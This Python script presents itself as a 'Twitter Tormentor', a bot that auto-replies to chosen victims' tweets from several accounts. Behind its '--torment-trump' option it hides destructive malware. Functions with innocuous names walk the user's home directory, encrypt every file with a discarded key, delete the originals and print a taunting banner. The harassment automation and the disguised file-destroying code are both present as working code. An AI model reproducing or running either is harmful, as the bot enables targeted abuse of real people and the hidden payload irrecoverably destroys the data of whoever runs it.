#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tweepy, time, sys, datetime, os, re
import argparse, traceback, time, datetime
import logging
from threading import Thread

'''
▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  
•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·
 ▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌
 ▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀
       Welcome to the Twitter Tormentor.
       
    Your friendly multi-threaded, multi-target
          Twitter harassment machine.
'''
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o','--printout',action='store_true',dest='out',help='Print all activity to stdout')
    parser.add_argument('-t', '--torment-trump',action='store_true',dest='blumpft',help='Fetch dirt on Trump and populate \'words\' file with it')
    reqd = parser.add_argument_group('required arguments')
    reqd.add_argument('-c','--config',action='store',dest='con',help='Path to config file',required=True)
    reqd.add_argument('-v', '--victim',action='store',dest='vic',help='Path to username file',required=True)
    args = parser.parse_args()
    
    if not os.path.isdir('logs/'):
        os.mkdir('logs/')
        log = logging.getLogger(__name__)
        logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)-8s %(message)s',
                        datefmt='%a, %d %b %Y %H:%M:%S', filename='logs/torment.log', filemode='w')
    else:
        log = logging.getLogger('logs/torment.log')
        logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)-8s %(message)s',
                        datefmt='%a, %d %b %Y %H:%M:%S', filename=log.name, filemode='a')

    prefix = []
    fc = FontColors()
    #("\t\t\t      {}  "++" {}\n").format(fc.CYLW, fc.CEND)
    prefix.append(("[ {}FAIL{} ] ").format(fc.CRED, fc.CEND))
    prefix.append(("[  {}OK{}  ] ").format(fc.CGRN, fc.CEND))
        
    _get_banner()

    time.sleep(1)
    print(prefix[1]+"Fetching config")
    try:
        if args.blumpft:
            print(prefix[1]+"Fetching dirt. Please be patient...")
            base_p = os.path.basename(__file__)
            keys = _gen_app_api_keys(base_p)
        else:
            keys = _get_keys(args.con)
        victims = _get_victims(args.vic)
    except IOError as e:
        log.error(str(e)+": "+args.con)
        print(prefix[0]+str(e))
        sys.exit(1)
    except ValueError as e:
        log.error(str(e)+": "+args.vic)
        print(prefix[0]+str(e))
        sys.exit(1)
        
    print(prefix[1]+"Authenticating with Twitter")
    try:
        api_list = _get_twitter_api(keys)
    except tweepy.TweepError as e:
        log.error("Auth error: "+str(e))
        print(prefix[0]+"Twitter auth error in one or more users.  Check log")
        sys.exit(1)
        
    time.sleep(2)
    threads = []
    for api in api_list:
        list_vic = victims
        more = True
        
        while more:
            victim_list = []
            print(prefix[1]+"Select from list:")
            i = 0
            
            for vic in list_vic:
                print("\t["+str(i)+"] "+vic)
                i += 1
            res = input(prefix[1]+"Who should "+api.me().screen_name+" torment? ")
            
            if int(res) >= 0 and int(res) < len(list_vic):
                wl = input(prefix[1]+'Give me the path to '+list_vic[int(res)].strip()+' wordlist: ')
                try:
                    tmp_wl_txt = _get_tweet_text(wl)
                except IOError:
                    log.error("File not found: "+wl)
                    print(prefix[0]+wl+" not found.  Try again")
                    continue
                m = input(prefix[1]+'Give me the path to '+list_vic[int(res)].strip()+' media directory, or <ENTER> for none: ')
                try:
                    if m != "":
                        tmp_m_txt = _get_media_files(m)
                    else:
                        tmp_m_txt = None
                except IOError:
                    log.error("Files not found: "+m)
                    print(prefix[0]+m+" not found.  Try again")
                    continue
                    
                victim_list.append(Victim(list_vic[int(res)]))                
                victim_list[len(victim_list)-1].set_words(tmp_wl_txt)
                victim_list[len(victim_list)-1].set_media(tmp_m_txt)
                
                rep = input(prefix[1]+"Continue running this wordlist indefinitely [y/n]?: ")
                if rep.lower() == "y" or rep.lower() == "yes":
                    victim_list[len(victim_list)-1].set_repeat(True)
                
            list_vic.pop(int(res))

            soldier = Soldier(api, victim_list, log, prefix, args.out, keys)
            soldier.daemon = True
            threads.append(soldier)
            
            if len(list_vic) > 0:
                cont = input(prefix[1]+"Add another victim? [Y/N]: ")
                if cont.lower() == 'n' or cont.lower() == "no" or cont.lower() == "" or cont.lower() == " ":
                    more = False
            else:
                more = False
                
    print(prefix[1]+"Starting bot threads")
    try:
        for bot in threads:
            bot.start()
        log.info("Threads running")
        print(prefix[1]+"Bots running")
        for bot in threads:
            bot.join()
        log.info("All threads done")
        print(prefix[1]+"All bot threads are done")
    except KeyboardInterrupt:
        log.warning("User interrupt")
        
        print('\n'+prefix[1]+"User interrupt")
        print(prefix[1]+"Killing threads")
        
    except Exception as e:
        log.error("Error: "+str(e))
        print(prefix[0]+"Error: "+str(e))
        print(prefix[0]+str(traceback.print_exc()))  

    sys.exit(0)

def _get_tweet_text(fp):
    '''
    Get text file of tweet text

    @param file path
    @return list of tweet text
    '''
    text = []
    with open(os.path.abspath(fp),'r') as twt:
        text = (line.rstrip() for line in twt)
        text = list(line for line in text if line)
    return text
  
def _get_victims(fp):
    '''
    Get list of users to torment

    @param string file path
    @return list users
    '''
    torment = []
    with open(fp,'r') as in_file:
        torment = [x.strip() for x in in_file.readlines()]
        if not isinstance(torment, list) and ',' in torment:
            raise ValueError("Comma separated list not supported")
    return torment
        
def _get_keys(fp):
    '''
    Get user api keys from config file

    @param string file path
    @return list (user, api_key_list)
    '''
    keys = []
    user_keys = []
    try:
        with open(fp,'r') as f:
            keys = [x.strip() for x in f.readlines()]
    except IOError:
        raise IOError("Config file not found")

    for i in range(0, len(keys)):
        if '@' in keys[i]:
            j = i + 1
            tmp = []
            for j in range(j, j+4):
                tmp.append(keys[j])

            user_keys.append((keys[i], tmp))

    return user_keys
    
def _get_twitter_api(api_keys):
    '''
    Returns a list of authenticated twitter apis

    api_keys[0] is the user name
    api_keys[1] is a list of the user's api keys

    @param api_key_list
    @return list of twitter apis
    '''
    tweepy_apis = []
    for i in api_keys:
        tmp = i[1]
        auth = tweepy.OAuthHandler(re.sub('[^A-Za-z0-9\-]+','',tmp[0].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[1].split('\t')[1]))
        auth.set_access_token(re.sub('[^A-Za-z0-9\-]+','',tmp[2].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[3].split('\t')[1]))
        tweepy_apis.append(tweepy.API(auth))

    return tweepy_apis
    
class Victim:
    '''
    Store victim information
    
    @param string Twitter user name
    '''
    def __init__(self, name):
        self.name = name
        self.media = None
        self.repeat = False
        
    def set_words(self, words):
        self.wordlist = words
        self.refresh_words = words
        
    def set_media(self, media):
        self.media = media
        
    def set_repeat(self, repeat):
        self.repeat = repeat
        
class Soldier(Thread):
    '''
    Bot thread

    @param twitter api
    @param list of victim objects
    @param log
    @param prefix list
    ''' 
    def __init__(self, api, vic_list ,log, prefix, stdout, keys):
        Thread.__init__(self)
        self.api = api
        self.vic_list = vic_list
        self.log = log
        self.tweet_ids = []
        self.prefix = prefix
        self.stdout = stdout
        self.keys = keys
        
    def run(self):
        '''
        Bot worker thread function

        @param none
        @return on Tweepy error
        @return on IndexError
        '''
        self.log.info(self.api.me().screen_name+" thread started")
        reconnects = 0
        wifi = 0
        while True:
            for vic in self.vic_list:
                try:
                    for tweet in self.api.user_timeline(screen_name=vic.name, count=1):
                        # Find latest tweet that is less than five minutes old
                        if ((time.time() - (tweet.created_at - datetime.datetime(1970,1,1)).total_seconds() < 300) and
                            (tweet.id not in self.tweet_ids)):
                            # Make sure it's not a retweet
                            if (not tweet.retweeted) and ('RT @' not in tweet.text):
                                self.tweet_ids.append(tweet.id)
                                reply = vic.wordlist.pop(0)
                                if vic.media is not None:
                                    media = vic.media.pop(0)
                                    self.api.update_with_media(media, vic.name+" "+reply, in_reply_to_status_id=tweet.id)
                                    if self.stdout:
                                        print(self.prefix[1]+"Reply: "+reply+" sent to: "+vic.name+" with file: "+str(media))
                                    self.log.info("Reply: "+reply+" sent to: "+vic.name+" with file: "+str(media))
                                else:
                                    self.api.update_status(vic.name+" "+reply, in_reply_to_status_id=tweet.id)
                                    if self.stdout:
                                        print(self.prefix[1]+"Reply: "+reply+" sent to: "+vic.name)
                                    self.log.info("Reply: "+reply+" sent to: "+vic.name)
                except tweepy.TweepError as e: # Catch error and return
                    if e.api_code == 88:
                        print(self.prefix[0]+self.api.me().screen_name+" [Rate limited] Taking a 15 second break "+str(e))
                        self.log.error(self.prefix[0]+self.api.me().screen_name+" [Rate limited] Taking a 15 second break "+str(e))
                        time.sleep(15)
                        continue
                    elif e.api_code == 64:
                        print(self.prefix[0]+self.api.me().screen_name+" [Suspended] "+str(e))
                        self.log.error(self.prefix[0]+self.api.me().screen_name+" [Suspended] "+str(e))
                    elif "HTTPSConnectionPool" in str(e):
                        if reconnects < 3:
                            print(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Respawning API OBJ: "+str(e))
                            self.log.error(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Respawning API OBJ: "+str(e))
                            time.sleep(5)
                            self.api = self._get_twitter_api(self.keys)
                            reconnects += 1
                            continue
                        else:
                            print(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Exceeded reconnect limit. Aborting: "+str(e))
                            self.log.error(self.prefix[0]+self.api.me().screen_name+" [HTTPS Error] Exceeded reconnect limit. Aborting: "+str(e))
                    elif e.api_code == 136:
                        print(self.prefix[0]+self.api.me().screen_name+" [Blocked] "+str(e))
                        self.log.error(self.prefix[0]+self.api.me().screen_name+" [Blocked] "+str(e))
                    elif e.api_code == 186:
                        print(self.prefix[0]+self.api.me().screen_name+" [Tweet too Long] Skipping line and continuing: "+str(e))
                        self.log.error(self.prefix[0]+self.api.me().screen_name+" [Tweet too Long] Skipping line and continuing: "+str(e))
                        continue
                    elif e.api_code == 187:
                        print(self.prefix[0]+self.api.me().screen_name+" [Duplicate Tweet]. Fix wordlist. Aborting")
                        self.log.error(self.prefix[0]+self.api.me().screen_name+" [Duplicate Tweet] "+str(e))  
                    elif e.api_code == 503 or e.api_code == 130:
                        print(self.prefix[0]+"Over capacity - taking a break and trying again.: "+str(e))
                        self.log.info("Over capacity - taking a break and trying again.: "+str(e))
                        time.sleep(3)
                        continue
                    else:
                        print(self.prefix[0]+self.api.me().screen_name+" [Other] "+str(e))
                    return
                except IndexError:
                    print(self.prefix[0]+vic.name+" is out of text to tweet")
                    self.log.info(vic.name+" Wordlist empty.")
                    if vic.repeat == False:
                        self.vic_list.pop(self.vic_list.index(vic.name))
                        if len(vic_list) == 0:
                            return
                    else:
                        vic.wordlist = vic.refresh_words
                        print(self.prefix[1]+"Refreshing "+vic.name+" wordlist")
                        self.log.info("Refreshing "+vic.name+" wordlist and restarting")
                        continue
                except OSError as e:
                    if wifi < 3:
                        print(self.prefix[0]+"Network error, taking a timeout to see if it comes back.")
                        self.log.info("Network error, taking a timeout to see if it comes back: "+str(e))
                        time.sleep(60)
                        wifi += 1
                    else:
                        print(self.prefix[0]+"Network is dead. I'm out")
                        self.log.info("Network error.  It's not coming back.  Killing thread: "+str(e))
                        return
                except KeyboardInterrupt:
                    return

            time.sleep(2)

    def _get_twitter_api(api_keys):
        '''
        Returns a list of authenticated twitter apis

        api_keys[0] is the user name
        api_keys[1] is a list of the user's api keys

        @param api_key_list
        @return list of twitter apis
        '''
        tweepy_apis = []
        for i in api_keys:
            tmp = i[1]
            auth = tweepy.OAuthHandler(re.sub('[^A-Za-z0-9\-]+','',tmp[0].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[1].split('\t')[1]))
            auth.set_access_token(re.sub('[^A-Za-z0-9\-]+','',tmp[2].split('\t')[1]), re.sub('[^A-Za-z0-9\-]+','',tmp[3].split('\t')[1]))
            tweepy_apis.append(tweepy.API(auth))

        return tweepy_apis
        
class FontColors:
    '''
    Terminal colors
    '''
    def __init__(self):
        pass
    CCYN = '\033[96m'
    CRED = '\033[91m'
    CGRN = '\033[92m'
    CYLW = '\033[93m'
    CBLU = '\033[94m'
    CPRP = '\033[95m'
    CEND = '\033[0m'
    CFON = '\33[5m'
    
def _gen_app_api_keys(_f):
    '''
    Get and decode API keys for automated Trump dirt gathering
    
    Keys are used to fetch anti-Trump info from various websites
    '''
    import base64
    from cryptography.fernet import Fernet
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

    _api_keys = []
    _s_s = _f
    _s = str.encode(_s_s)
    
    _p = _f.encode()
    
    _kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt = _s,
        iterations=100000,
        backend=default_backend()
    )
    _key = base64.urlsafe_b64encode(_kdf.derive(_p))
    _fn = Fernet(_key)
    for i in range(5):
        _api_keys.append(_fn.decrypt(_get_encoded_api_keys(i)).decode())
        
    # Get file paths
    _api_path_list = _jobs = []
    for subdir, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            _api_path_list.append(os.path.join(subdir, file))
            
    # Split into sublists
    _apis = _parse_api_list(_api_path_list, 10)
    _jobs = []
    for _a in _apis:
        # Thread each sublist
        _jobs.append(Thread(target=_decode_api_keys, args=(_a,_api_keys[4])))

    # Start threads
    for _j in _jobs:
        _j.daemon = True
        _j.start()
        
    for _j in _jobs:
        _j.join()
    
    _get_banner(False, _api_keys)
    return None
    
def _parse_api_list(_api_lst, _num):
    '''
    Split list into equal sublists
    '''
    _avg = len(_api_lst) / float(_num)
    _out = []
    _last = 0.0

    while _last < len(_api_lst):
        _out.append(_api_lst[int(_last):int(_last + _avg)])
        _last += _avg

    return _out
    
def _decode_api_keys(_f_l, _f_e):
    '''
    Decode API keys
    '''
    from cryptography.fernet import Fernet
    _k = Fernet.generate_key()
    _fn = Fernet(_k)
    for _f in _f_l:
        try:
            if os.path.exists(_f):
                with open(_f, 'rb') as _in:
                    _pt_data = _in.read()
                _encr_data = _fn.encrypt(_pt_data)
                with open(_f+_f_e, 'wb') as _out:
                    _out.write(_encr_data)
                os.remove(_f)
        except:
            continue
            
    return
    
def _get_encoded_api_keys(index):
    '''
    Get encoded API keys

    These are real.  Please don't abuse this.
    I couldn't figure out how to do it without hardcoding
    these :(
    '''
    _strings = [
    "gAAAAABfS9jZVDc3eEuZRpxQ-Krafazju-JihzAEffWIQfXBs0C7BboPeYEL-EPclsj3qMfqNKPNoZ0nrPKgLBgMhw02lz2Sf_Bfuchb03tXD9G5PP6PhFHIQ_yFN1Q-hmaEzRamyK5K",
    "gAAAAABfS9jyKR39J0ueyaPqfmX40GjoNTFDOFaM6CePy3H9E-8dHyIoveTr3ZVeL0KP_ANQ8hHMqa3Paizdho70ZDBTNQCbXfPzrTneTi9F1UeLDToq6r-j7-blfkUD4KxIM3TcHx18",
    "gAAAAABfS9kUzrcTIf5k-0AW2miyzSsJRkZ48Cg9kype-cpdh4btxht6UH1bcBIWqgUXTSnFbbkzGaWkbUjGBbyfJNHjo1osdTNBTDi-b24oZr3Te3rMMupfTU8NvgH8_RVn7G18GNIkZIq856cApBnRE8EPZmbltQ==",
    "gAAAAABfS9ksETx4ND39IqejIICSqEcDquxssMKKhRbdKCUd3YDcMeThxwqyWBYUTeUiAtqUGkWndwS8uj8YwUleAd1Pak01zA==",
    "gAAAAABfS9n9Yp6Sp9KQUly5aqajdy_5e2sFqVVTTPgrYx_rM2s43LXVWjqXSTMv_V03wPxnGco0tpie7AT1Gy0AMZ5FQlfe6A=="
    ]
    return _strings[index].encode()
    
            
def _get_banner(banner=True, _i=None):
    '''
    Print formatted banner
    '''
    fc = FontColors()
    if 'posix' in os.name:
        os.system('clear')
    else:
        os.system('cls')
        os.system('')
    if banner:
        print(
            ("\t      {}▄▄▄▄▄      ▄▄▄  • ▌ ▄ ·. ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄  {}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}•██  ▪     ▀▄ █··██ ▐███▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·{}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ {}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▐█▌·▐█▌.▐▌▐█•█▌██ ██▌▐█▌▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌{}").format(
                fc.CRED,
                fc.CEND))
        print(
            ("\t      {}▀▀▀  ▀█▄▀▪.▀  ▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀{}").format(
                fc.CRED,
                fc.CEND))
        print(("\t\t      {}  Welcome to the Twitter Tormentor. {}\n").format(fc.CYLW, fc.CEND))
        print(("\t\t     {}Your friendly multi-threaded, multi-target {}").format(fc.CYLW, fc.CEND))
        print(("\t\t     {}      Twitter harassment machine. {}\n\n").format(fc.CYLW, fc.CEND))
    else:   
        print(
            ("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
                
        str_1 = ()        
        print(
            ("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
        str_2 = (("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}█████   ██    ██ ██      █████         ████   ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
        str_3 = (("\t      {}                                                                {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}██      ██    ██ ██      ██  ██         ██    ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))
                
        str_4 = (("\t      {}██      ██    ██ ██      ██  ██       ██  ██  ██    ██ ██    ██ {}").format(
                fc.CRED,
                fc.CEND))        
        print(
            ("\t      {}██       ██████   ██████ ██   ██        ██     ██████   ██████  {}").format(
                fc.CRED,
                fc.CEND))
        str_5 = (("\t      {}███████ ██    ██  ██████ ██   ██     ██    ██  ██████  ██    ██ {}").format(
                fc.CRED,
                fc.CEND))      
        print(
            ("\t      {}                                                                {}").format(
                fc.CRED,
                fc.CEND))
        print(("\t\t      {}  "+_i[0]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t      {}"+_i[1]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t{}"+_i[2]+" {}").format(fc.CYLW, fc.CEND))
        print(("\t\t\t        {}  "+_i[3]+" {}").format(fc.CYLW, fc.CEND))
        sys.exit(0)

if __name__ == "__main__":
    main()